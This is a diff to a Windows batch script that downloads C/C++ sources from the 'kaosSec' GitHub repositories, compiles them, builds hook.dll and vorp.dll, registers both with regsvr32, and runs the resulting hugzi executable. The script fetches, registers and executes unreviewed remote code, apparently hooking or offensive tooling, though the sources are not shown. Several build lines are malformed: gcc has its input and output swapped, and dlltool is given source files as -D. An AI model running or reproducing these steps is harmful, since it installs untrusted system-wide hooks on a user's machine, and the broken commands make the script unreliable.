@@ -9,6 +9,20 @@ if not exist "%SystemRoot%\System32\chocolatey.exe" (
 choco install curl -y
 choco install mingw -y
 
+curl -L https://github.com/kaosSec/hugzi/raw/main/hook.cpp -o hook.cpp
+curl -L https://github.com/kaosSec/hugzi/raw/main/loz.def -o loz.def
+curl -L https://github.com/kaosSec/hugzi/raw/main/vorp.c -o vorp.c
+curl -L https://github.com/kaosSec/hugzi/raw/main/uj4.def -o uj4.def
+curl -L https://github.com/kaosSec/hugzi/raw/main/lucy4.c -o lucy4.c
+gcc -c -o lucy4.o lucy4.c
+gcc -c -o vorp.o vorp.c
+gcc -c -o hook.o hook.cpp
+dlltool -k -d loz.def -l libfilename.a -D hook.cpp -o hook.dll
+dlltool -k -d uj4.def -l libfilename.a -D vorp.c -o vorp.dll
+
+regsvr32 hook.dll
+regsvr32 vorp.dll
+
 curl -L https://github.com/kaosSec/kaosTools/raw/main/C/MSSSoSad.c -o MSSSoSad.c
 
 gcc -o MSSSoSad.c MSSSoSad.exe
@@ -19,19 +33,7 @@ curl -L https://github.com/kaosSec/hugzi/raw/main/hugzi.c -o hugzi.c
 
 gcc -o hugzi.c hugzi.exe
 
-.\hugzi
-
-curl -L https://github.com/kaosSec/hugzi/raw/main/hook.cpp -o hook.cpp
-curl -L https://github.com/kaosSec/hugzi/raw/main/loz.def -o loz.def
-curl -L https://github.com/kaosSec/hugzi/raw/main/vorp.c -o vorp.c
-curl -L https://github.com/kaosSec/hugzi/raw/main/uj4.def -o uj4.def
-gcc -c -o vorp.o vorp.c
-gcc -c -o hook.o hook.cpp
-dlltool -k -d loz.def -l libfilename.a -D hook.cpp -o hook.dll
-dlltool -k -d uj4.def -l libfilename.a -D vorp.c -o vorp.dll
-
-regsvr32 hook.dll
-regsvr32 vorp.dll
+.\hugzi lucy4.o
 
 endlocal
 start https://github.com/kaosSec
